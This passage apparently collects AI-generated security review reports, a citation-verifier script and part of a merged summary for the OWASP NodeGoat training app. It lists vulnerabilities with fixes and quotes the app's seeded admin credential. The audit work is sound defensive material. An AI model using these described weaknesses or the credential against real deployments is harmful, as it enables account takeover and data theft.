27: For each route, an unauthenticated caller is redirected to `/login` by `isLoggedIn`/`isAdminUserMiddleware` (both read in full, `app/routes/session.js:25-42`) except for `/`, `/login`, `/signup`, `/logout`, and `/tutorial/*`, which are intentionally public. The gap is not at that layer: `isLoggedIn` only checks that *some* session exists, so a caller authenticated as the wrong identity — any valid, non-admin account — still passes it on `/benefits` (no role check) and on `/allocations/:userId` (no ownership check), which is where the two access-control findings below live.
28: 
29: Files read in full: `server.js`, `config/config.js`, `config/env/all.js`, `app/routes/index.js`, `app/routes/session.js`, `app/routes/profile.js`, `app/routes/allocations.js`, `app/routes/benefits.js`, `app/routes/contributions.js`, `app/routes/memos.js`, `app/routes/research.js`, `app/routes/tutorial.js`, `app/data/user-dao.js`, `app/data/profile-dao.js`, `app/data/benefits-dao.js`.
30: 
31: ## Findings
32: 
33: 1. **`access-idor-allocations-userid`** (high, confirmed) — `GET /allocations/:userId` (`app/routes/index.js:63`) checks only that the caller is logged in; the handler trusts `req.params.userId` and hands it straight to the DAO, so any account can read any other user's allocation data.
34: 2. **`access-missing-admin-check-benefits-update`** (high, confirmed) — `POST /benefits` (`app/routes/index.js:56`) never applies the `isAdmin` middleware that already exists (`session.js:25-34`); any logged-in user can overwrite another user's `benefitStartDate`, and the paired GET renders the admin roster to every caller.
35: 3. **`access-login-no-session-regenerate`** (medium, confirmed) — `handleLoginRequest` sets `req.session.userId` (`session.js:116`) without regenerating the session id, unlike `handleSignup` in the same file, which does; a session id fixed before login carries the victim's post-login privileges.
36: 4. **`access-password-compare-not-constant-time`** (high, confirmed) — `comparePassword` (`app/data/user-dao.js:61`) is a plain `fromDB === fromUser`, timing-unsafe, and it compares against a password that is never hashed in the first place (`user-dao.js:25`).
37: 5. **`access-csrf-missing-profile-update`** (high, confirmed) — `csurf()` is never mounted anywhere in `server.js` (commented out at lines 7 and 104-113); `POST /profile` (`app/routes/index.js:48`) accepts bank/SSN/address changes from a cookie-only session with no token.
38: 6. **`access-session-cookie-insecure-config`** (medium, confirmed) — the `express-session` call (`server.js:78-102`) sets no `cookie` block at all: no `httpOnly`, no `secure`, no `maxAge`, confirmed both by reading the object literal and by semgrep's `express-cookie-settings` hits on the same line.
39: 
40: ## What was not covered
41: 
42: - **Injection-adjacent findings visible in the same files were left to the injection department**: the NoSQL `$where` query in `app/data/allocations-dao.js:73,78`, the `eval()` on `req.body.preTax/afterTax/roth` in `app/routes/contributions.js:32-34`, the open redirect in `app/routes/index.js:72` (`/learn`), and the SSRF in `app/routes/research.js:16`. These were read enough to confirm they are not the access-control gap on those routes, not traced end-to-end for their own sinks.
43: - **Hardcoded secrets** (`config/env/all.js:8`, `development.js:6`, `test.js:6`) were seen via semgrep and are a secrets-department finding (the cookie-signing secret's exposure is relevant to session integrity but the finding itself — a committed literal — is theirs to report).
44: - **MFA** — NodeGoat has no MFA implementation anywhere in the read files; there is nothing to evaluate for CWE-308, so no finding was written for it.
45: - **Brute-force protection on `/login` and `/signup`** — no rate limiter or lockout middleware is registered anywhere in `server.js` or `app/routes/index.js` (no `express-rate-limit`-style package appears in the require list), which is a real gap, but it was not written up as a numbered finding here because no single line registers the (absent) control to cite against the "quote the exact line" rule; it is recorded here as a gap the customer's own team should close, most naturally by adding a limiter in front of `app.post("/login", ...)` at `app/routes/index.js:34`.
46: - **Client-side / view-layer files** (`app/views/*.html`) were not read for access-control issues (e.g., whether admin-only UI elements are merely hidden rather than guarded server-side); the two routes flagged above make this concern moot for `/benefits`, but the other views were not audited for the same pattern.
47: - **`test/`, `artifacts/`, and asset/vendor files** were not read; they carry no route registrations.
48: - **JWT** — NodeGoat's session layer uses `express-session`/cookie sessions, not JWTs, on every route read; the JWT pitfalls section of the access skill does not apply to this codebase and was not evaluated further.
49: 
50: ## Certificate
51: 
52: Run `node verify-safety-report.mjs --findings findings/access.json` before every commit; at the time of writing it reported `ok: 6 findings verified against /root/targets/NodeGoat`.
53: 
54: This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".

(End of file - total 54 lines)
</content>

1: # Data department — sensitive data exposure, logging, and cryptography
2: 
3: ## Scope and method
4: 
5: Target: `/root/targets/NodeGoat` (111 files locked in `target.json`, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`). This review is a static read by a language model, grounded by `semgrep` and by the `verify-safety-report.mjs` examiner; it is not a dynamic test and does not certify the absence of vulnerabilities.
6: 
7: `semgrep --version` reported `1.177.0`, so `semgrep --config <local rules> --config p/owasp-top-ten --metrics off --json /root/targets/NodeGoat` was run. It scanned 72 git-tracked files with 113 rules and returned 29 hits: GitHub Actions mutable-tag warnings, a NoSQL `$where` pattern, `eval()` on request input, plaintext-HTTP links in tutorial HTML, hardcoded-secret hits in `config/env/*.js`, an open-redirect pattern, and missing Express session-cookie flags. Every hit was read in context; semgrep output was treated as a reading list, not as findings in itself.
8: 
9: Followed the data lifecycle by hand from there: how the password, SSN/DOB/bank fields, and the session/crypto secrets are received (`app/routes/session.js`, `app/routes/profile.js`), stored (`app/data/user-dao.js`, `app/data/profile-dao.js`, `artifacts/db-reset.js`), transmitted (`server.js`), and returned to the client on error (`app/routes/error.js`, `app/views/error-template.html`). Also read `config/config.js`, `config/env/all.js`, `config/env/development.js`, `config/env/production.js`, `config/env/test.js`, `docker-compose.yml`, and every `app/data/*-dao.js` file, and grepped the whole tree for `console.log`/`console.error`, `Math.random`, `createHash`/`createCipher`, `rejectUnauthorized`, and `NODE_TLS_REJECT_UNAUTHORIZED`.
10: 
11: ## What was found
12: 
13: Six findings, all `confirmed` — the source, the path, and the sink were all read for each, with no guard between them:
14: 
15: 1. **Plaintext password storage and comparison** (`app/data/user-dao.js:25`, high) — signup stores the raw password; login compares it with `===`. The `bcrypt-nodejs` dependency is installed but never called; the working bcrypt code is present only as a comment.
16: 2. **Seed script logs plaintext admin/user credentials on every container start** (`artifacts/db-reset.js:99`, medium) — hardcoded passwords for `admin`, `user1`, `user2` are serialized to stdout by the same `db-reset.js` that `docker-compose.yml` runs on every `web` container boot.
17: 3. **The session-signing secret and crypto key are dumped to stdout on every app start** (`config/config.js:13`, high) — `console.log(util.inspect(config, ...))` prints the merged config, including the hardcoded `cookieSecret` that signs every session cookie.
18: 4. **The application only ever serves plain HTTP** (`server.js:145`, high) — the HTTPS path (already coded, using `artifacts/cert/server.key`/`.crt`) is fully commented out, so login credentials, session cookies, and financial/PII form data travel unencrypted.
19: 5. **SSN, date of birth, bank account and routing numbers are stored unencrypted** (`app/data/profile-dao.js:55-66`, high) — the only encryption path in the file (a PBKDF2-derived AES key) is commented out end to end; `bankAcc`/`bankRouting` never had an encryption path at all.
20: 6. **Internal error objects are rendered to the client on every unhandled error** (`app/routes/error.js:10-12`, medium) — combined with Swig's global `autoescape: false` (`server.js:137`), the error's name/message reach the HTML response with no development-only gate.
21: 
22: Full detail, evidence, and fixes for each are in `findings/data.json`.
23: 
24: ## What was not covered
25: 
26: - **NoSQL injection, XSS, open redirect, ReDoS, and `eval()` on request input** — semgrep flagged real instances of these (e.g. `app/data/allocations-dao.js:73/78`, `app/routes/contributions.js:32-34`, `app/routes/index.js:72`) but they are injection-class bugs, not data-exposure findings, and are left to the injection department.
27: - **Session cookie flags** (`secure`, `httpOnly`, `maxAge` all absent or commented out in `server.js:78-102`) and session-fixation/regeneration — read and confirmed present, but scoped to the access department per this program's department split.
28: - **The hardcoded `cookieSecret` and `cryptoKey` values themselves as committed secrets** (`config/env/all.js:8-9`) — read and confirmed; left to the secrets department's CWE-798 lane rather than duplicated here, since this department's angle on that same code is the logging exposure in `config/config.js:13` (finding 3 above).
29: - **Dependency/advisory analysis** (e.g. the age of `bcrypt-nodejs`, `swig`, or other pinned packages in `package-lock.json`) was not performed; that is the dependencies department's remit.
30: - **Runtime/deployment configuration** — actual `NODE_ENV`, whether `docker-compose.yml`'s `MONGODB_URI` is overridden in a real deployment, and where container logs are actually shipped, were not observable from a static read and were not assumed.
31: - **Binary and vendored assets** (`app/assets/vendor/*`, fonts, images) were not read; they are third-party, unmodified library code.
32: - **Timing side channels, memory safety in native modules (e.g. `bcrypt-nodejs`'s C++ addon), and anything gated behind infrastructure this review had no access to** were not checked.

(End of file - total 32 lines)
</content>

1: # Platform department — security misconfiguration and the web platform
2: 
3: ## Scope and method
4: 
5: Target: `/root/targets/NodeGoat` (111 files locked in `target.json`, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`), read-only.
6: 
7: This is a review by a language model, grounded by a static scanner (Semgrep 1.177.0, run with the local `program-code-safety` rule pack plus the `p/owasp-top-ten` registry pack, `--metrics off --json`, 29 hits) and by the mechanical checks in `verify-safety-report.mjs`. Semgrep hits were treated only as pointers to read, never as findings on their own; every finding below quotes a line I read directly in the target tree.
8: 
9: Reading order followed the review-method discipline: `server.js` end to end first (the whole middleware stack, in mount order), then every file the semgrep hits or the server.js read pointed at:
10: 
11: - `server.js` (full file, all 157 lines)
12: - `app/routes/index.js`, `app/routes/session.js`, `app/routes/error.js` (route wiring, login/signup handlers, global error handler)
13: - `app/views/layout.html`, `app/views/error-template.html` (what the templates do with server-provided values)
14: - `config/config.js`, `config/env/all.js`, `config/env/development.js`, `config/env/production.js` (how the app picks and merges configuration)
15: - `package.json` (dependency list, to confirm `helmet` and `csurf` are installed but check whether they are actually mounted, and to confirm no `cors`/rate-limiting package exists)
16: - `Dockerfile`, `docker-compose.yml` (container and compose configuration)
17: 
18: A repository-wide grep additionally confirmed there is no `cors`/`Access-Control-Allow-Origin` handling anywhere in application code, and no `rate-limit`/`express-brute` dependency or code path.
19: 
20: ## Findings
21: 
22: Nine findings, all `confidence: confirmed` (the full path from the entry point/middleware stack to the missing or weak control was read, not inferred). Filed to `findings/platform.json`.
23: 
24: ### High
25: 
26: - **`platform-no-tls`** (`server.js:144`, CWE-319) — the app only ever calls `http.createServer(app).listen(...)`; the `https.createServer` block and the certificate loading it needs are commented out (lines 18-28, 149-155). Login credentials and the session cookie travel in cleartext.
27: - **`platform-cookie-flags-missing`** (`server.js:78`, CWE-1004) — the `express-session` options set only `secret`, `saveUninitialized` and `resave`; the `cookie: { httpOnly: true, secure: true }` object and the `key: "sessionId"` rename are both left inside block comments, so the session cookie ships as the framework-default `connect.sid` with no HttpOnly, Secure or SameSite attribute.
28: - **`platform-csrf-disabled`** (`server.js:104`, CWE-352) — `csurf` is an installed dependency but both the `require` (line 7) and the middleware that would mount it (lines 104-113) are commented out; none of the state-changing POST routes (`/login`, `/signup`, `/profile`, `/contributions`, `/benefits`, `/memos`) verify a token.
29: 
30: ### Medium
31: 
32: - **`platform-missing-security-headers`** (`server.js:38-65`, CWE-693) — every Helmet call (`frameguard`, `noCache`, `contentSecurityPolicy`, `hsts`) and the `nosniff()`/`x-powered-by` disable are inside one large block comment; nothing else in the file sets these headers.
33: - **`platform-session-unbounded-lifetime`** (`server.js:82-85`, CWE-613) — `saveUninitialized: true` and `resave: true` with no `cookie.maxAge` anywhere in the options object: a session record is created and re-persisted for every visitor, authenticated or not, and never expires server-side.
34: - **`platform-error-handler-leaks-error-object`** (`app/routes/error.js:10`, CWE-209) — the global error handler passes the caught `err` object straight into the `error-template` view, which renders it unescaped (`error-template.html:11`, swig autoescape globally disabled at `server.js:137`).
35: - **`platform-open-redirect-learn`** (`app/routes/index.js:70`, CWE-601) — `GET /learn` calls `res.redirect(req.query.url)` with no validation of the target.
36: - **`platform-no-rate-limit-auth-routes`** (`app/routes/index.js:32-34`, CWE-307) — `POST /login` reaches `handleLoginRequest` with no throttling middleware in front of it and no dependency in `package.json` that could provide one; the same applies to `POST /signup`.
37: - **`platform-default-env-is-development`** (`config/config.js:5`, CWE-1188) — `NODE_ENV` defaults to `"development"` when unset (the Dockerfile and `npm start` do not set it), which loads `config/env/development.js` and its raw live-reload `<script>` string into `environmentalScripts`, rendered unescaped on every page by `layout.html:126`.
38: 
39: ## What was not covered
40: 
41: - **Injection, authentication logic and dependency vulnerabilities** were not the target of this pass; the semgrep run surfaced additional leads there (an `eval`-on-input pattern in `app/routes/contributions.js:32-34`, a MongoDB `$where` pattern in `app/data/allocations-dao.js:73/78`, hard-coded secrets in `config/env/all.js:8` and `config/env/development.js:6`) that belong to the `injection`, `access` and `secrets` departments respectively and were read only far enough to route them, not traced to a confirmed finding here.
42: - **CORS** was checked (no `cors` package, no `Access-Control-Allow-Origin` header set anywhere in application code) but since NodeGoat is a same-origin server-rendered app with no API consumed cross-origin, there is no CORS misconfiguration to report — this is an absence of the pattern, not an unexamined area.
43: - **File uploads**: the codebase has no upload endpoint, so CWE-434 does not apply here.
44: - **Source maps**: this is a server-rendered Express app with no client bundler/build step in the reviewed tree, so "source maps shipped in production" does not apply.
45: - **Docker/Compose**: read `Dockerfile` and `docker-compose.yml`; the image already drops to a non-root `USER node` and Mongo is only `expose`d internally, not published to the host, so no finding was filed there. nginx configuration is not present in this repository.
46: - **Runtime behavior**: nothing here was exercised against a running instance; all findings are static reads of the committed configuration. Whether an operator sets `NODE_ENV=production` or terminates TLS at a reverse proxy in front of this app is infrastructure this review had no access to, and is called out explicitly in `platform-no-tls` and `platform-default-env-is-development` rather than assumed either way.
47: - **Client-side JavaScript** (`app/assets/js/*`, vendor bundles) was scanned by semgrep and spot-read; no `postMessage` handler or DOM-based URL-trust sink was found in the application's own scripts (`chart-data-morris.js`, `redirects-steps.js`); the vendored `jquery.min.js`/`bootstrap*.js` were not audited line-by-line as they are third-party, unmodified libraries.
48: 
49: This review does not certify NodeGoat as secure; it lists only what was read and confirmed as of this commit of the target tree.

(End of file - total 49 lines)
</content>

1: #!/usr/bin/env node
2: // Mechanical examiner of a code-safety report. It is in the report
3: // repository's base commit, so no department can change what measures it.
4: //
5: //   node verify-safety-report.mjs --findings <path>  one department's findings
6: //   node verify-safety-report.mjs --findings <path> --list-invalid
7: //   node verify-safety-report.mjs --report           the merged report
8: //
9: // `--findings` decides one findings file against the target tree. Adding
10: // `--list-invalid` turns the same decision into a report: the failing ids go to
11: // stdout, one per line, and the exit code is 0, which is how the integration
12: // learns which findings to drop and disclose.
13: //
14: // `--report` decides SAFETY-REPORT.md and findings.json together, including the
15: // disclosure rule: every id any `findings/<department>.json` carries and
16: // findings.json does not must be named under `## What was not covered`.
17: //
18: // Exit 0 only when every rule holds; otherwise every failure is printed to
19: // stderr, one per line, and the exit code is 1. Node built-ins only, because
20: // this runs in a worktree that installs nothing.
21: import { createHash } from 'node:crypto'
22: import { existsSync, readdirSync, readFileSync } from 'node:fs'
23: import { basename, join, relative, resolve } from 'node:path'
24: 
25: /** Severities a finding may claim, most severe first. */
26: const SEVERITIES = ['critical', 'high', 'medium', 'low', 'info']
27: 
28: /** How sure a finding's author is that the cited code is exploitable as described. */
29: const CONFIDENCES = ['confirmed', 'likely', 'possible']
30: 
31: /** Sections SAFETY-REPORT.md carries, in this order. */
32: const SECTIONS = [
33:   '## Résumé exécutif',
34:   '## Executive summary',
35:   '## Scope and method',
36:   '## Findings',
37:   '## What was not covered',
38:   '## Certificate',
39: ]
40: 
41: /** The claim the certificate must make verbatim, and the only claim this review supports. */
42: const HONESTY = 'This review does not certify the absence of vulnerabilities; it certifies only that each listed finding was mechanically verified to exist at the cited line, over the files listed in "Scope and method".'
43: 
44: /** Claims no coverage this review can state would support. */
45: const OVERCLAIMS = /\bno vulnerabilities\b|\bfree of vulnerabilities\b|\b(?:is|are|was|were) secure\b|\bsafe to deploy\b|\bproven secure\b|\bfully audited\b/i
46: 
47: /** Text a report still carrying its template is refused for. */
48: const PLACEHOLDER = /\bTODO\b|\bTBD\b|\bFIXME\b|lorem ipsum|<placeholder>|PLACEHOLDER/i
49: 
50: /** String fields every finding states in prose. */
51: const PROSE_FIELDS = ['title', 'evidence', 'impact', 'fix']
52: 
53: /** How a file's text is compared with a finding's quoted snippet. */
54: const normalize = (text) => text.replace(/\s+/g, ' ').trim()
55: 
56: /** Lowercase hex SHA-256 of one buffer or string. */
57: const sha256 = (content) => createHash('sha256').update(content).digest('hex')
58: 
59: /**
60:  * Every file under one directory, relative and sorted, skipping the excluded names.
61:  * @param {string} root directory to walk
62:  * @param {string[]} exclude directory basenames never descended into
63:  * @returns {string[]} relative POSIX-ish paths, sorted
64:  */
65: function walk(root, exclude) {
66:   const found = []
67:   const descend = (directory) => {
68:     for (const entry of readdirSync(directory, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name))) {
69:       const path = join(directory, entry.name)
70:       if (entry.isDirectory()) {
71:         if (!exclude.includes(entry.name)) descend(path)
72:       } else if (entry.isFile()) found.push(relative(root, path))
73:     }
74:   }
75:   descend(root)
76:   return found.sort()
77: }
78: 
79: /** One target tree as the lock and the verifier both read it: the files, their digests, and their text. */
80: class Target {
81:   /**
82:    * @param {string} reportRoot the report repository the lock is committed in
83:    * @param {string[]} failures collector every rule appends to
84:    */
85:   constructor(reportRoot, failures) {
86:     this.failures = failures
87:     this.root = undefined
88:     this.files = new Map()
89:     this.lines = new Map()
90:     const lockPath = join(reportRoot, 'target.json')
91:     if (!existsSync(lockPath)) {
92:       failures.push('target.json is missing from this worktree; the base commit carries the lock of the tree under review')
93:       return
94:     }
95:     const lock = JSON.parse(readFileSync(lockPath, 'utf8'))
96:     this.root = lock.root
97:     this.exclude = lock.exclude ?? []
98:     this.digest = lock.sha256
99:     for (const [path, hash] of Object.entries(lock.files)) this.files.set(path, hash)
100:     this.checkTree()
101:   }
102: 
103:   /**
104:    * Refuse a target that changed since the base commit locked it: a finding
105:    * cites a line of the tree this program was asked to review, and a tree a
106:    * department edited is no longer that tree.
107:    */
108:   checkTree() {
109:     if (!existsSync(this.root)) {
110:       this.failures.push(`the target tree ${this.root} is not on this host, so no citation can be resolved`)
111:       this.root = undefined
112:       return
113:     }
114:     const present = walk(this.root, this.exclude)
115:     for (const path of present) {
116:       if (!this.files.has(path)) this.failures.push(`the target tree gained ${path} since the base commit locked it`)
117:     }
118:     for (const [path, hash] of this.files) {
119:       if (!present.includes(path)) {
120:         this.failures.push(`the target tree lost ${path} since the base commit locked it`)
121:         continue
122:       }
123:       if (sha256(readFileSync(join(this.root, path))) !== hash) {
124:         this.failures.push(`the target tree's ${path} changed since the base commit locked it; the target is read-only for this program`)
125:       }
126:     }
127:   }
128: 
129:   /**
130:    * The lines of one target file.
131:    * @param {string} path path relative to the target root
132:    * @returns {string[] | undefined} the file's lines, or undefined when it is not in the locked tree
133:    */
134:   linesOf(path) {
135:     if (this.root === undefined || !this.files.has(path)) return undefined
136:     if (!this.lines.has(path)) this.lines.set(path, readFileSync(join(this.root, path), 'utf8').split('\n'))
137:     return this.lines.get(path)
138:   }
139: 
140:   /**
141:    * Whether one `file:line` citation resolves in the locked tree.
142:    * @param {string} path path relative to the target root
143:    * @param {number} line 1-based line number
144:    * @returns {boolean} whether the file is under review and holds that line
145:    */
146:   resolves(path, line) {
147:     const lines = this.linesOf(path)
148:     return lines !== undefined && Number.isInteger(line) && line >= 1 && line <= lines.length
149:   }
150: }
151: 
152: /**
153:  * Decide one finding against the target tree.
154:  * @param {unknown} finding one entry of a findings file
155:  * @param {number} index its position, named when the entry has no usable id
156:  * @param {Target} target the locked tree the finding cites
157:  * @param {Set<string>} seen ids already used in this file
158:  * @returns {string[]} every rule this finding broke, empty when it holds
159:  */
160: function checkFinding(finding, index, target, seen) {
161:   const failures = []
162:   if (finding === null || typeof finding !== 'object' || Array.isArray(finding)) {
163:     return [`finding #${index + 1} is not a JSON object`]
164:   }
165:   const id = finding.id
166:   const name = typeof id === 'string' && id !== '' ? id : `#${index + 1}`
167:   const fail = (rule) => void failures.push(`${name}: ${rule}`)
168:   // Letters, digits, `-`, `_` and `.`: wide enough for both the `SEC-001`
169:   // numbering the knowledge pack's schema uses and a department-prefixed name.
170:   if (typeof id !== 'string' || !/^[A-Za-z0-9][\w.-]*$/.test(id)) fail('id must be letters, digits, dots, dashes or underscores')
171:   else if (seen.has(id)) fail('id is used twice in this file')
172:   else seen.add(id)
173:   if (typeof finding.cwe !== 'string' || !/^CWE-\d+$/.test(finding.cwe)) fail('cwe must match CWE-<number>')
174:   if (typeof finding.owasp !== 'string' || finding.owasp.trim() === '') fail('owasp must name the category')
175:   if (!SEVERITIES.includes(finding.severity)) fail(`severity must be one of ${SEVERITIES.join(', ')}`)
176:   if (!CONFIDENCES.includes(finding.confidence)) fail(`confidence must be one of ${CONFIDENCES.join(', ')}`)
177:   for (const field of PROSE_FIELDS) {
178:     if (typeof finding[field] !== 'string' || finding[field].trim() === '') fail(`${field} must be a non-empty string`)
179:   }
180:   if (!Array.isArray(finding.references) || finding.references.some(reference => typeof reference !== 'string')) {
181:     fail('references must be an array of strings')
182:   }
183:   const { file, line, endLine, snippet } = finding
184:   if (typeof file !== 'string' || file === '' || file.startsWith('/') || file.split('/').includes('..')) {
185:     fail('file must be a path relative to the target root')
186:     return failures
187:   }
188:   const lines = target.linesOf(file)
189:   if (lines === undefined) {
190:     fail(`file ${file} is not in the tree under review`)
191:     return failures
192:   }
193:   if (!Number.isInteger(line) || line < 1 || line > lines.length) {
194:     fail(`line ${JSON.stringify(line)} is outside ${file}, which has ${lines.length} lines`)
195:     return failures
196:   }
197:   const last = endLine === undefined ? line : endLine
198:   if (!Number.isInteger(last) || last < line || last > lines.length) {
199:     fail(`endLine ${JSON.stringify(endLine)} is outside ${file}, which has ${lines.length} lines`)
200:     return failures
201:   }
202:   if (typeof snippet !== 'string' || snippet.trim() === '') {
203:     fail('snippet must quote the cited line')
204:     return failures
205:   }
206:   const quoted = normalize(lines.slice(line - 1, last).join('\n'))
207:   if (normalize(snippet) !== quoted) {
208:     fail(`snippet does not match ${file}:${line}, which reads ${JSON.stringify(quoted.slice(0, 160))}`)
209:   }
210:   return failures
211: }
212: 
213: /**
214:  * Read one findings file.
215:  * @param {string} path the file to read
216:  * @param {string[]} failures collector a malformed file is reported on
217:  * @returns {unknown[]} the entries, empty when the file is missing or malformed
218:  */
219: function readFindings(path, failures) {
220:   if (!existsSync(path)) {
221:     failures.push(`${path} is missing`)
222:     return []
223:   }
224:   let parsed
225:   try {
226:     parsed = JSON.parse(readFileSync(path, 'utf8'))
227:   } catch (error) {
228:     failures.push(`${path} is not JSON: ${error.message}`)
229:     return []
230:   }
231:   if (!Array.isArray(parsed)) {
232:     failures.push(`${path} must be a JSON array of findings`)
233:     return []
234:   }
235:   return parsed
236: }
237: 
238: /**
239:  * Decide one findings file on its own.
240:  * @param {string} path the findings file
241:  * @param {Target} target the locked tree it cites
242:  * @returns {{ failures: string[], invalid: string[], findings: unknown[] }} the broken rules, the ids that broke them, and the entries
243:  */
244: function checkFindingsFile(path, target) {
245:   const failures = []
246:   const findings = readFindings(path, failures)
247:   const invalid = []
248:   const seen = new Set()
249:   findings.forEach((finding, index) => {
250:     const broken = checkFinding(finding, index, target, seen)
251:     if (broken.length === 0) return
252:     failures.push(...broken.map(rule => `${basename(path)}: ${rule}`))
253:     invalid.push(typeof finding?.id === 'string' ? finding.id : `#${index + 1}`)
254:   })
255:   return { failures, invalid, findings }
256: }
257: 
258: /**
259:  * The body of one section of the report.
260:  * @param {string} text the whole report
261:  * @param {string} heading the section heading, including its `##`
262:  * @returns {string} the text between this heading and the next one, empty when absent
263:  */
264: function section(text, heading) {
265:   const start = text.indexOf(`${heading}\n`)
266:   if (start === -1) return ''
267:   const body = text.slice(start + heading.length + 1)
268:   const next = body.search(/^## /m)
269:   return next === -1 ? body : body.slice(0, next)
270: }

## Executive summary

This review covered the locked source tree at `/root/targets/NodeGoat` (111 files, sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`), the OWASP NodeGoat training application. Six departments (access, data, dependencies, injection, platform, secrets) each read a slice of the repository, grounded by the Semgrep 1.177.0 static scanner and, for dependencies, by `npm audit` against the live npm registry; the integration then merged their 48 raw findings into 47 unique findings, deduplicated by file, line and CWE. Method: entry points read before any conclusion, data traced from source to sink, one finding per sink, the exact line quoted and mechanically checked by the program's examiner, and a stated confidence level for each.

- high: 18
- medium: 17

Target: `/root/targets/NodeGoat`, locked in `target.json` to 111 files under sha256 `78ac112b7bd5083bb065086c4642dcd8a3932a8d3052f9405503124c90a70fe3`. ## Findings

### critical

- `deps-mongodb` — mongodb driver (`^2.1.18`, installed 2.2.36) pulls a critically vulnerable bson deserializer (`package.json:18`, CWE-502, likely) — an attacker who can influence BSON bytes the driver deserializes can trigger memory corruption or a crash across every route that touches MongoDB; upgrade to a maintained 7.x driver line.
- `injection-eval-contributions` — server-side code injection via `eval()` on request body fields (`app/routes/contributions.js:32`, CWE-95, confirmed) — any authenticated user can submit a body that runs arbitrary Node.js code on the server via `POST /contributions`; replace `eval()` with `Number()`/`parseInt()` and reject non-numeric input.
- `injection-xss-memos-marked` — stored XSS visible to every user via unescaped Markdown rendering of memo content (`app/views/memos.html:31`, CWE-79, likely) — a crafted memo can run script in the browser of every user who opens `/memos`, including an admin; render Markdown through a maintained sanitizer (DOMPurify/sanitize-html) rather than relying on `marked`'s deprecated `sanitize` option.
- `secrets-admin-seed-password` — admin account seeded with a hard-coded plaintext password compared by strict equality (`artifacts/db-reset.js:18`, CWE-798, confirmed) — any unauthenticated visitor can log in as `admin`/`Admin_123` on a deployment that ran the seed script; generate a random password per deployment, hash it, and force a change on first login.

- `access-idor-allocations-userid` — allocations page is an IDOR: any logged-in user can read any other user's allocation data by changing the URL (`app/routes/index.js:63`, CWE-639, confirmed) — walk `:userId` to enumerate other users' financial records; load allocations for `req.session.userId` only, or verify ownership before querying.
- `access-missing-admin-check-benefits-update` — admin-only benefits update has no role check; any logged-in user can change any other user's benefit start date (`app/routes/index.js:56`, CWE-862, confirmed) — full vertical privilege escalation on a state-changing route; apply the existing `isAdmin` middleware to both the GET and POST `/benefits` routes.
- `access-password-compare-not-constant-time` — login compares passwords with plain string equality on plaintext-stored passwords, not a constant-time hash verify (`app/data/user-dao.js:61`, CWE-916, confirmed) — timing leakage plus plaintext-at-rest disclosure on any DB read; hash with bcrypt and verify with `bcrypt.compareSync`.
- `data-cleartext-http-transport` — the application only ever listens over plain HTTP; the HTTPS path is fully commented out (`server.js:145`, CWE-319, confirmed) — credentials, session cookies and SSN/bank data travel in the clear on the wire; enable the existing `https.createServer` path and redirect HTTP to HTTPS.

- `data-ssn-bank-cleartext-storage` — SSN, date of birth and bank account/routing numbers are stored in the database unencrypted (`app/data/profile-dao.js:55`, CWE-312, confirmed) — read access to the `users` collection discloses PII and financial data enabling identity theft/fraud; encrypt at rest with an authenticated cipher keyed from a KMS/secrets manager.

- `deps-swig` — `swig` (installed 1.4.2, the last release ever published) is the app's view engine and carries an unfixed path-traversal advisory (`package.json:22`, CWE-22, likely) — a request path that influences which template renders could read arbitrary server-readable files, with no upstream fix available; replace swig with a maintained template engine.
- `deps-underscore` — `underscore` (`^1.8.3`, installed 1.9.1) is below the version that fixes a template code-execution advisory (`package.json:23`, CWE-94, likely) — attacker-influenced data reaching `_.template` or the affected recursive functions yields code execution or a DoS; upgrade to `underscore@1.13.7` or later.
- `injection-nosql-where-allocations` — NoSQL injection via unescaped `$where` clause built from a query-string threshold (`app/data/allocations-dao.js:78`, CWE-943, confirmed) — a crafted `threshold` triggers a MongoDB-side infinite loop or breaks out of the intended comparison to read other users' records; build queries from typed, bounds-checked fields instead of a `$where` string.

- `platform-cookie-flags-missing` — session cookie is configured with no httpOnly, secure or sameSite attribute and keeps the default cookie name (`server.js:78`, CWE-1004, confirmed) — the session id is readable via XSS, sent over plain HTTP, and attached on cross-site requests; set `cookie: { httpOnly: true, secure: true, sameSite: 'strict' }` once served over HTTPS.

### medium
